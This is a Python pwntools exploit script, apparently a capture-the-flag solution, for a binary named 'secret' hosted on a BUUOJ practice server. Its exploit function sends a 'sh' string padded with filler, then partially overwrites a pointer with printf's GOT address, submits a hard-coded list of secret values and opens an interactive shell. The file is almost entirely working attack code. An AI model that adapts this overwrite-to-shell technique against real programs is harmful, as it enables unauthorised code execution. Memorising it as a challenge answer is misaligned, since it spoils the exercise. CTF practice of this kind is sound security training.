#!/usr/bin/env python3
#-*- coding:utf-8 -*-
# author: i0gan
# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


context.log_level='debug'

elf_path  = 'secret'
MODIFY_LD = 0
arch = '64'
libc_v = '2.27'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
libc_path = './libc.so.6'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)

# remote server ip and port
server_ip = "node3.buuoj.cn"
server_port = 27323

# if local debug
LOCAL = 0
LIBC  = 0


#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)


#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	ru('?')
	p =  b'sh\x00'
	p = p.ljust(0x10, b'A')
	p += p64(elf.got['printf'])[0:5]

	s(p)
	secret = [0x476B, 0x2D38, 0x4540, 0x3E77, 0x3162, 0x3F7D, 0x357A, 0x3CF5
			 ,0x2F9E, 0x41EA, 0x48D8, 0x2763, 0x474C, 0x3809, 0x2E63, 0x2F4A
			 ,0x3298, 0x28F3, 0x3D1B, 0x449E, 0x3328]
	for i in secret:
		ru('Secret:')	
		sl(str(i))

	ru('Secret:')	
	#db()
	sl('1')

def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
		else:
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
